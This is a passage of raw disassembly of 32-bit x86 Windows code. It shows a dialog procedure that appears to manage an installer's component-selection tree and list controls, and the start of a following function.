  405079:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  40507f:	57                   	push   %edi
  405080:	68 f9 03 00 00       	push   $0x3f9
  405085:	53                   	push   %ebx
  405086:	ff d6                	call   *%esi
  405088:	68 08 04 00 00       	push   $0x408
  40508d:	53                   	push   %ebx
  40508e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405091:	ff d6                	call   *%esi
  405093:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405096:	a1 88 9a 42 00       	mov    0x429a88,%eax
  40509b:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4050a1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4050a4:	a1 70 9a 42 00       	mov    0x429a70,%eax
  4050a9:	33 ff                	xor    %edi,%edi
  4050ab:	05 94 00 00 00       	add    $0x94,%eax
  4050b0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4050b7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4050ba:	0f 85 25 02 00 00    	jne    0x4052e5
  4050c0:	a1 8c 9a 42 00       	mov    0x429a8c,%eax
  4050c5:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4050c8:	c1 e0 02             	shl    $0x2,%eax
  4050cb:	50                   	push   %eax
  4050cc:	6a 40                	push   $0x40
  4050ce:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  4050d5:	89 1d c0 9a 42 00    	mov    %ebx,0x429ac0
  4050db:	ff 15 10 81 40 00    	call   *0x408110
  4050e1:	57                   	push   %edi
  4050e2:	57                   	push   %edi
  4050e3:	57                   	push   %edi
  4050e4:	57                   	push   %edi
  4050e5:	6a 6e                	push   $0x6e
  4050e7:	a3 40 2f 42 00       	mov    %eax,0x422f40
  4050ec:	ff 35 60 9a 42 00    	push   0x429a60
  4050f2:	ff 15 44 82 40 00    	call   *0x408244
  4050f8:	83 0d 34 2f 42 00 ff 	orl    $0xffffffff,0x422f34
  4050ff:	68 7b 56 40 00       	push   $0x40567b
  405104:	6a fc                	push   $0xfffffffc
  405106:	8b d8                	mov    %eax,%ebx
  405108:	ff 75 fc             	push   -0x4(%ebp)
  40510b:	ff 15 40 82 40 00    	call   *0x408240
  405111:	57                   	push   %edi
  405112:	6a 06                	push   $0x6
  405114:	6a 21                	push   $0x21
  405116:	6a 10                	push   $0x10
  405118:	6a 10                	push   $0x10
  40511a:	a3 3c 2f 42 00       	mov    %eax,0x422f3c
  40511f:	ff 15 40 80 40 00    	call   *0x408040
  405125:	68 ff 00 ff 00       	push   $0xff00ff
  40512a:	53                   	push   %ebx
  40512b:	50                   	push   %eax
  40512c:	a3 2c 2f 42 00       	mov    %eax,0x422f2c
  405131:	ff 15 3c 80 40 00    	call   *0x40803c
  405137:	ff 35 2c 2f 42 00    	push   0x422f2c
  40513d:	6a 02                	push   $0x2
  40513f:	68 09 11 00 00       	push   $0x1109
  405144:	ff 75 fc             	push   -0x4(%ebp)
  405147:	ff d6                	call   *%esi
  405149:	57                   	push   %edi
  40514a:	57                   	push   %edi
  40514b:	68 1c 11 00 00       	push   $0x111c
  405150:	ff 75 fc             	push   -0x4(%ebp)
  405153:	ff d6                	call   *%esi
  405155:	83 f8 10             	cmp    $0x10,%eax
  405158:	7d 0d                	jge    0x405167
  40515a:	57                   	push   %edi
  40515b:	6a 10                	push   $0x10
  40515d:	68 1b 11 00 00       	push   $0x111b
  405162:	ff 75 fc             	push   -0x4(%ebp)
  405165:	ff d6                	call   *%esi
  405167:	53                   	push   %ebx
  405168:	ff 15 54 80 40 00    	call   *0x408054
  40516e:	33 db                	xor    %ebx,%ebx
  405170:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405173:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405176:	3b c7                	cmp    %edi,%eax
  405178:	74 27                	je     0x4051a1
  40517a:	83 fb 20             	cmp    $0x20,%ebx
  40517d:	74 03                	je     0x405182
  40517f:	89 7d f0             	mov    %edi,-0x10(%ebp)
  405182:	50                   	push   %eax
  405183:	57                   	push   %edi
  405184:	e8 36 15 00 00       	call   0x4066bf
  405189:	50                   	push   %eax
  40518a:	57                   	push   %edi
  40518b:	68 43 01 00 00       	push   $0x143
  405190:	ff 75 f8             	push   -0x8(%ebp)
  405193:	ff d6                	call   *%esi
  405195:	53                   	push   %ebx
  405196:	50                   	push   %eax
  405197:	68 51 01 00 00       	push   $0x151
  40519c:	ff 75 f8             	push   -0x8(%ebp)
  40519f:	ff d6                	call   *%esi
  4051a1:	43                   	inc    %ebx
  4051a2:	83 fb 21             	cmp    $0x21,%ebx
  4051a5:	7c c9                	jl     0x405170
  4051a7:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4051aa:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4051ad:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  4051b1:	6a 15                	push   $0x15
  4051b3:	ff 75 08             	push   0x8(%ebp)
  4051b6:	e8 46 f4 ff ff       	call   0x404601
  4051bb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4051be:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  4051c2:	6a 16                	push   $0x16
  4051c4:	ff 75 08             	push   0x8(%ebp)
  4051c7:	e8 35 f4 ff ff       	call   0x404601
  4051cc:	33 db                	xor    %ebx,%ebx
  4051ce:	39 3d 8c 9a 42 00    	cmp    %edi,0x429a8c
  4051d4:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4051d7:	0f 8e ca 00 00 00    	jle    0x4052a7
  4051dd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4051e0:	8d 50 08             	lea    0x8(%eax),%edx
  4051e3:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4051e6:	8d 42 10             	lea    0x10(%edx),%eax
  4051e9:	66 39 38             	cmp    %di,(%eax)
  4051ec:	0f 84 97 00 00 00    	je     0x405289
  4051f2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4051f5:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4051f8:	8b 02                	mov    (%edx),%eax
  4051fa:	6a 20                	push   $0x20
  4051fc:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  4051ff:	59                   	pop    %ecx
  405200:	8b d0                	mov    %eax,%edx
  405202:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  405209:	23 d1                	and    %ecx,%edx
  40520b:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  405212:	a8 02                	test   $0x2,%al
  405214:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405217:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40521a:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40521d:	74 3a                	je     0x405259
  40521f:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405222:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  405229:	50                   	push   %eax
  40522a:	57                   	push   %edi
  40522b:	68 32 11 00 00       	push   $0x1132
  405230:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  405237:	ff 75 fc             	push   -0x4(%ebp)
  40523a:	ff d6                	call   *%esi
  40523c:	8b 0d 40 2f 42 00    	mov    0x422f40,%ecx
  405242:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405249:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  40524c:	a1 40 2f 42 00       	mov    0x422f40,%eax
  405251:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405254:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405257:	eb 30                	jmp    0x405289
  405259:	a8 04                	test   $0x4,%al
  40525b:	74 14                	je     0x405271
  40525d:	ff 75 f4             	push   -0xc(%ebp)
  405260:	6a 03                	push   $0x3
  405262:	68 0a 11 00 00       	push   $0x110a
  405267:	ff 75 fc             	push   -0x4(%ebp)
  40526a:	ff d6                	call   *%esi
  40526c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40526f:	eb 18                	jmp    0x405289
  405271:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405274:	50                   	push   %eax
  405275:	57                   	push   %edi
  405276:	68 32 11 00 00       	push   $0x1132
  40527b:	ff 75 fc             	push   -0x4(%ebp)
  40527e:	ff d6                	call   *%esi
  405280:	8b 0d 40 2f 42 00    	mov    0x422f40,%ecx
  405286:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405289:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40528c:	43                   	inc    %ebx
  40528d:	81 c2 18 08 00 00    	add    $0x818,%edx
  405293:	3b 1d 8c 9a 42 00    	cmp    0x429a8c,%ebx
  405299:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40529c:	0f 8c 44 ff ff ff    	jl     0x4051e6
  4052a2:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4052a5:	75 19                	jne    0x4052c0
  4052a7:	6a f0                	push   $0xfffffff0
  4052a9:	ff 75 fc             	push   -0x4(%ebp)
  4052ac:	ff 15 d4 81 40 00    	call   *0x4081d4
  4052b2:	24 fb                	and    $0xfb,%al
  4052b4:	50                   	push   %eax
  4052b5:	6a f0                	push   $0xfffffff0
  4052b7:	ff 75 fc             	push   -0x4(%ebp)
  4052ba:	ff 15 40 82 40 00    	call   *0x408240
  4052c0:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  4052c3:	75 18                	jne    0x4052dd
  4052c5:	6a 05                	push   $0x5
  4052c7:	ff 75 f8             	push   -0x8(%ebp)
  4052ca:	ff 15 28 82 40 00    	call   *0x408228
  4052d0:	ff 75 f8             	push   -0x8(%ebp)
  4052d3:	e8 5e f3 ff ff       	call   0x404636
  4052d8:	e9 89 03 00 00       	jmp    0x405666
  4052dd:	ff 75 fc             	push   -0x4(%ebp)
  4052e0:	e8 51 f3 ff ff       	call   0x404636
  4052e5:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4052ec:	75 12                	jne    0x405300
  4052ee:	33 c9                	xor    %ecx,%ecx
  4052f0:	89 7d 10             	mov    %edi,0x10(%ebp)
  4052f3:	41                   	inc    %ecx
  4052f4:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4052fb:	89 4d 14             	mov    %ecx,0x14(%ebp)
  4052fe:	eb 03                	jmp    0x405303
  405300:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405303:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  405307:	b8 13 04 00 00       	mov    $0x413,%eax
  40530c:	74 09                	je     0x405317
  40530e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405311:	0f 85 e4 00 00 00    	jne    0x4053fb
  405317:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40531a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40531d:	74 0d                	je     0x40532c
  40531f:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  405326:	0f 85 cf 00 00 00    	jne    0x4053fb
  40532c:	f6 05 79 9a 42 00 02 	testb  $0x2,0x429a79
  405333:	75 73                	jne    0x4053a8
  405335:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405338:	74 09                	je     0x405343
  40533a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40533d:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  405341:	75 65                	jne    0x4053a8
  405343:	33 c9                	xor    %ecx,%ecx
  405345:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405348:	0f 95 c1             	setne  %cl
  40534b:	51                   	push   %ecx
  40534c:	ff 75 fc             	push   -0x4(%ebp)
  40534f:	e8 68 fc ff ff       	call   0x404fbc
  405354:	8b d8                	mov    %eax,%ebx
  405356:	3b df                	cmp    %edi,%ebx
  405358:	7c 4e                	jl     0x4053a8
  40535a:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405360:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405363:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  405367:	8b 01                	mov    (%ecx),%eax
  405369:	a8 10                	test   $0x10,%al
  40536b:	75 3b                	jne    0x4053a8
  40536d:	a8 40                	test   $0x40,%al
  40536f:	74 11                	je     0x405382
  405371:	35 80 00 00 00       	xor    $0x80,%eax
  405376:	84 c0                	test   %al,%al
  405378:	79 04                	jns    0x40537e
  40537a:	0c 01                	or     $0x1,%al
  40537c:	eb 07                	jmp    0x405385
  40537e:	24 fe                	and    $0xfe,%al
  405380:	eb 03                	jmp    0x405385
  405382:	83 f0 01             	xor    $0x1,%eax
  405385:	53                   	push   %ebx
  405386:	89 01                	mov    %eax,(%ecx)
  405388:	e8 f0 bd ff ff       	call   0x40117d
  40538d:	a1 78 9a 42 00       	mov    0x429a78,%eax
  405392:	43                   	inc    %ebx
  405393:	f7 d0                	not    %eax
  405395:	c1 e8 08             	shr    $0x8,%eax
  405398:	83 e0 01             	and    $0x1,%eax
  40539b:	89 5d 10             	mov    %ebx,0x10(%ebp)
  40539e:	89 45 14             	mov    %eax,0x14(%ebp)
  4053a1:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4053a8:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4053ab:	74 4e                	je     0x4053fb
  4053ad:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4053b0:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  4053b7:	75 0e                	jne    0x4053c7
  4053b9:	ff 70 5c             	push   0x5c(%eax)
  4053bc:	57                   	push   %edi
  4053bd:	68 19 04 00 00       	push   $0x419
  4053c2:	ff 75 fc             	push   -0x4(%ebp)
  4053c5:	ff d6                	call   *%esi
  4053c7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4053ca:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  4053d1:	75 28                	jne    0x4053fb
  4053d3:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  4053d7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4053da:	8b 40 5c             	mov    0x5c(%eax),%eax
  4053dd:	75 0f                	jne    0x4053ee
  4053df:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4053e5:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4053e9:	83 08 20             	orl    $0x20,(%eax)
  4053ec:	eb 0d                	jmp    0x4053fb
  4053ee:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4053f4:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4053f8:	83 20 df             	andl   $0xffffffdf,(%eax)
  4053fb:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405402:	75 6f                	jne    0x405473
  405404:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  40540a:	0f 85 56 02 00 00    	jne    0x405666
  405410:	8b 45 10             	mov    0x10(%ebp),%eax
  405413:	c1 e8 10             	shr    $0x10,%eax
  405416:	66 3d 01 00          	cmp    $0x1,%ax
  40541a:	0f 85 46 02 00 00    	jne    0x405666
  405420:	57                   	push   %edi
  405421:	57                   	push   %edi
  405422:	68 47 01 00 00       	push   $0x147
  405427:	ff 75 f8             	push   -0x8(%ebp)
  40542a:	ff d6                	call   *%esi
  40542c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40542f:	0f 84 31 02 00 00    	je     0x405666
  405435:	57                   	push   %edi
  405436:	50                   	push   %eax
  405437:	68 50 01 00 00       	push   $0x150
  40543c:	ff 75 f8             	push   -0x8(%ebp)
  40543f:	ff d6                	call   *%esi
  405441:	8b d8                	mov    %eax,%ebx
  405443:	83 fb ff             	cmp    $0xffffffff,%ebx
  405446:	74 08                	je     0x405450
  405448:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40544b:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  40544e:	75 03                	jne    0x405453
  405450:	6a 20                	push   $0x20
  405452:	5b                   	pop    %ebx
  405453:	53                   	push   %ebx
  405454:	e8 40 be ff ff       	call   0x401299
  405459:	53                   	push   %ebx
  40545a:	57                   	push   %edi
  40545b:	68 20 04 00 00       	push   $0x420
  405460:	ff 75 08             	push   0x8(%ebp)
  405463:	ff d6                	call   *%esi
  405465:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  405469:	89 7d 14             	mov    %edi,0x14(%ebp)
  40546c:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405473:	b8 00 02 00 00       	mov    $0x200,%eax
  405478:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40547b:	75 08                	jne    0x405485
  40547d:	57                   	push   %edi
  40547e:	57                   	push   %edi
  40547f:	50                   	push   %eax
  405480:	ff 75 fc             	push   -0x4(%ebp)
  405483:	ff d6                	call   *%esi
  405485:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40548c:	75 32                	jne    0x4054c0
  40548e:	a1 2c 2f 42 00       	mov    0x422f2c,%eax
  405493:	3b c7                	cmp    %edi,%eax
  405495:	74 07                	je     0x40549e
  405497:	50                   	push   %eax
  405498:	ff 15 34 80 40 00    	call   *0x408034
  40549e:	a1 40 2f 42 00       	mov    0x422f40,%eax
  4054a3:	3b c7                	cmp    %edi,%eax
  4054a5:	74 07                	je     0x4054ae
  4054a7:	50                   	push   %eax
  4054a8:	ff 15 0c 81 40 00    	call   *0x40810c
  4054ae:	89 3d 2c 2f 42 00    	mov    %edi,0x422f2c
  4054b4:	89 3d 40 2f 42 00    	mov    %edi,0x422f40
  4054ba:	89 3d c0 9a 42 00    	mov    %edi,0x429ac0
  4054c0:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4054c7:	0f 85 5b 01 00 00    	jne    0x405628
  4054cd:	57                   	push   %edi
  4054ce:	57                   	push   %edi
  4054cf:	e8 1b bd ff ff       	call   0x4011ef
  4054d4:	8b 45 10             	mov    0x10(%ebp),%eax
  4054d7:	3b c7                	cmp    %edi,%eax
  4054d9:	74 0e                	je     0x4054e9
  4054db:	83 f8 ff             	cmp    $0xffffffff,%eax
  4054de:	74 01                	je     0x4054e1
  4054e0:	48                   	dec    %eax
  4054e1:	50                   	push   %eax
  4054e2:	6a 08                	push   $0x8
  4054e4:	e8 53 fb ff ff       	call   0x40503c
  4054e9:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4054ec:	74 3f                	je     0x40552d
  4054ee:	ff 35 40 2f 42 00    	push   0x422f40
  4054f4:	e8 e9 bd ff ff       	call   0x4012e2
  4054f9:	8b d8                	mov    %eax,%ebx
  4054fb:	53                   	push   %ebx
  4054fc:	e8 98 bd ff ff       	call   0x401299
  405501:	33 c0                	xor    %eax,%eax
  405503:	33 c9                	xor    %ecx,%ecx
  405505:	3b df                	cmp    %edi,%ebx
  405507:	7e 0e                	jle    0x405517
  405509:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40550c:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  40550f:	74 01                	je     0x405512
  405511:	41                   	inc    %ecx
  405512:	40                   	inc    %eax
  405513:	3b c3                	cmp    %ebx,%eax
  405515:	7c f2                	jl     0x405509
  405517:	57                   	push   %edi
  405518:	51                   	push   %ecx
  405519:	68 4e 01 00 00       	push   $0x14e
  40551e:	ff 75 f8             	push   -0x8(%ebp)
  405521:	ff d6                	call   *%esi
  405523:	89 5d 14             	mov    %ebx,0x14(%ebp)
  405526:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  40552d:	57                   	push   %edi
  40552e:	57                   	push   %edi
  40552f:	e8 bb bc ff ff       	call   0x4011ef
  405534:	a1 40 2f 42 00       	mov    0x422f40,%eax
  405539:	39 3d 8c 9a 42 00    	cmp    %edi,0x429a8c
  40553f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405542:	a1 88 9a 42 00       	mov    0x429a88,%eax
  405547:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  40554e:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405551:	0f 8e 9c 00 00 00    	jle    0x4055f3
  405557:	8d 58 08             	lea    0x8(%eax),%ebx
  40555a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40555d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405560:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  405563:	3b c7                	cmp    %edi,%eax
  405565:	74 74                	je     0x4055db
  405567:	8b 0b                	mov    (%ebx),%ecx
  405569:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40556c:	f6 c5 01             	test   $0x1,%ch
  40556f:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  405576:	74 11                	je     0x405589
  405578:	8d 43 10             	lea    0x10(%ebx),%eax
  40557b:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  405582:	89 45 c8             	mov    %eax,-0x38(%ebp)
  405585:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  405589:	f6 c1 40             	test   $0x40,%cl
  40558c:	74 05                	je     0x405593
  40558e:	6a 03                	push   $0x3
  405590:	58                   	pop    %eax
  405591:	eb 0e                	jmp    0x4055a1
  405593:	8b c1                	mov    %ecx,%eax
  405595:	83 e0 01             	and    $0x1,%eax
  405598:	40                   	inc    %eax
  405599:	f6 c1 10             	test   $0x10,%cl
  40559c:	74 03                	je     0x4055a1
  40559e:	83 c0 03             	add    $0x3,%eax
  4055a1:	8b d1                	mov    %ecx,%edx
  4055a3:	ff 75 bc             	push   -0x44(%ebp)
  4055a6:	c1 e0 0b             	shl    $0xb,%eax
  4055a9:	83 e2 08             	and    $0x8,%edx
  4055ac:	0b c2                	or     %edx,%eax
  4055ae:	8b d1                	mov    %ecx,%edx
  4055b0:	c1 f9 05             	sar    $0x5,%ecx
  4055b3:	03 c0                	add    %eax,%eax
  4055b5:	83 e2 20             	and    $0x20,%edx
  4055b8:	83 e1 01             	and    $0x1,%ecx
  4055bb:	0b c2                	or     %edx,%eax
  4055bd:	41                   	inc    %ecx
  4055be:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4055c1:	51                   	push   %ecx
  4055c2:	68 02 11 00 00       	push   $0x1102
  4055c7:	ff 75 fc             	push   -0x4(%ebp)
  4055ca:	ff d6                	call   *%esi
  4055cc:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4055cf:	50                   	push   %eax
  4055d0:	57                   	push   %edi
  4055d1:	68 3f 11 00 00       	push   $0x113f
  4055d6:	ff 75 fc             	push   -0x4(%ebp)
  4055d9:	ff d6                	call   *%esi
  4055db:	ff 45 ec             	incl   -0x14(%ebp)
  4055de:	81 c3 18 08 00 00    	add    $0x818,%ebx
  4055e4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4055e7:	3b 05 8c 9a 42 00    	cmp    0x429a8c,%eax
  4055ed:	0f 8c 67 ff ff ff    	jl     0x40555a
  4055f3:	66 81 3d 1e 9b 42 00 	cmpw   $0x400,0x429b1e
  4055fa:	00 04 
  4055fc:	75 0c                	jne    0x40560a
  4055fe:	6a 01                	push   $0x1
  405600:	57                   	push   %edi
  405601:	ff 75 fc             	push   -0x4(%ebp)
  405604:	ff 15 54 82 40 00    	call   *0x408254
  40560a:	a1 3c 8a 42 00       	mov    0x428a3c,%eax
  40560f:	39 78 10             	cmp    %edi,0x10(%eax)
  405612:	74 14                	je     0x405628
  405614:	6a 05                	push   $0x5
  405616:	e8 74 f9 ff ff       	call   0x404f8f
  40561b:	50                   	push   %eax
  40561c:	6a fb                	push   $0xfffffffb
  40561e:	68 ff 03 00 00       	push   $0x3ff
  405623:	e8 4f f9 ff ff       	call   0x404f77
  405628:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  40562f:	75 35                	jne    0x405666
  405631:	f6 05 79 9a 42 00 01 	testb  $0x1,0x429a79
  405638:	74 2c                	je     0x405666
  40563a:	33 c0                	xor    %eax,%eax
  40563c:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  405640:	8b 35 28 82 40 00    	mov    0x408228,%esi
  405646:	0f 94 c0             	sete   %al
  405649:	c1 e0 03             	shl    $0x3,%eax
  40564c:	8b f8                	mov    %eax,%edi
  40564e:	57                   	push   %edi
  40564f:	ff 75 fc             	push   -0x4(%ebp)
  405652:	ff d6                	call   *%esi
  405654:	57                   	push   %edi
  405655:	68 fe 03 00 00       	push   $0x3fe
  40565a:	ff 75 08             	push   0x8(%ebp)
  40565d:	ff 15 3c 82 40 00    	call   *0x40823c
  405663:	50                   	push   %eax
  405664:	ff d6                	call   *%esi
  405666:	ff 75 14             	push   0x14(%ebp)
  405669:	ff 75 10             	push   0x10(%ebp)
  40566c:	ff 75 0c             	push   0xc(%ebp)
  40566f:	e8 f4 ef ff ff       	call   0x404668
  405674:	5f                   	pop    %edi
  405675:	5e                   	pop    %esi
  405676:	5b                   	pop    %ebx
  405677:	c9                   	leave
  405678:	c2 10 00             	ret    $0x10
  40567b:	55                   	push   %ebp
  40567c:	8b ec                	mov    %esp,%ebp
  40567e:	53                   	push   %ebx
  40567f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405682:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  405688:	57                   	push   %edi
  405689:	75 14                	jne    0x40569f
  40568b:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  40568f:	75 59                	jne    0x4056ea
  405691:	68 13 04 00 00       	push   $0x413
  405696:	e8 b2 ef ff ff       	call   0x40464d
  40569b:	33 c0                	xor    %eax,%eax
  40569d:	eb 62                	jmp    0x405701
  40569f:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4056a5:	75 20                	jne    0x4056c7
  4056a7:	ff 75 08             	push   0x8(%ebp)
  4056aa:	ff 15 b4 81 40 00    	call   *0x4081b4
  4056b0:	85 c0                	test   %eax,%eax
  4056b2:	74 36                	je     0x4056ea
  4056b4:	6a 01                	push   $0x1
  4056b6:	ff 75 08             	push   0x8(%ebp)
  4056b9:	e8 fe f8 ff ff       	call   0x404fbc
  4056be:	8b f8                	mov    %eax,%edi
  4056c0:	bb 19 04 00 00       	mov    $0x419,%ebx
  4056c5:	eb 03                	jmp    0x4056ca
  4056c7:	8b 7d 14             	mov    0x14(%ebp),%edi
  4056ca:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  4056d0:	75 1b                	jne    0x4056ed
  4056d2:	39 3d 34 2f 42 00    	cmp    %edi,0x422f34
  4056d8:	74 13                	je     0x4056ed
  4056da:	57                   	push   %edi
  4056db:	6a 06                	push   $0x6
  4056dd:	89 3d 34 2f 42 00    	mov    %edi,0x422f34
  4056e3:	e8 54 f9 ff ff       	call   0x40503c
  4056e8:	eb 03                	jmp    0x4056ed
  4056ea:	8b 7d 14             	mov    0x14(%ebp),%edi
  4056ed:	57                   	push   %edi
  4056ee:	ff 75 10             	push   0x10(%ebp)
  4056f1:	53                   	push   %ebx
  4056f2:	ff 75 08             	push   0x8(%ebp)
  4056f5:	ff 35 3c 2f 42 00    	push   0x422f3c
  4056fb:	ff 15 b8 81 40 00    	call   *0x4081b8
  405701:	5f                   	pop    %edi
  405702:	5b                   	pop    %ebx
  405703:	5d                   	pop    %ebp
  405704:	c2 10 00             	ret    $0x10
  405707:	55                   	push   %ebp
  405708:	8b ec                	mov    %esp,%ebp
  40570a:	83 ec 30             	sub    $0x30,%esp
  40570d:	a1 44 8a 42 00       	mov    0x428a44,%eax
  405712:	53                   	push   %ebx
  405713:	56                   	push   %esi
  405714:	57                   	push   %edi
  405715:	33 ff                	xor    %edi,%edi
  405717:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40571a:	3b c7                	cmp    %edi,%eax
  40571c:	0f 84 b1 00 00 00    	je     0x4057d3
  405722:	8b 1d 14 9b 42 00    	mov    0x429b14,%ebx
  405728:	be 28 1f 42 00       	mov    $0x421f28,%esi
  40572d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405730:	83 e3 01             	and    $0x1,%ebx
  405733:	75 09                	jne    0x40573e
  405735:	ff 75 08             	push   0x8(%ebp)
  405738:	56                   	push   %esi
  405739:	e8 81 0f 00 00       	call   0x4066bf
  40573e:	56                   	push   %esi
  40573f:	e8 54 0f 00 00       	call   0x406698
  405744:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405747:	89 45 08             	mov    %eax,0x8(%ebp)
  40574a:	74 1b                	je     0x405767
  40574c:	ff 75 0c             	push   0xc(%ebp)
  40574f:	e8 44 0f 00 00       	call   0x406698
  405754:	03 45 08             	add    0x8(%ebp),%eax
  405757:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40575c:	73 75                	jae    0x4057d3
  40575e:	ff 75 0c             	push   0xc(%ebp)
  405761:	56                   	push   %esi
  405762:	e8 37 0f 00 00       	call   0x40669e
  405767:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  40576b:	75 0d                	jne    0x40577a
  40576d:	56                   	push   %esi
  40576e:	ff 35 28 8a 42 00    	push   0x428a28
  405774:	ff 15 1c 82 40 00    	call   *0x40821c
  40577a:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  40577e:	75 44                	jne    0x4057c4
  405780:	57                   	push   %edi
  405781:	57                   	push   %edi
  405782:	68 04 10 00 00       	push   $0x1004
  405787:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40578a:	ff 75 fc             	push   -0x4(%ebp)
  40578d:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405793:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  40579a:	ff d6                	call   *%esi
  40579c:	2b c3                	sub    %ebx,%eax
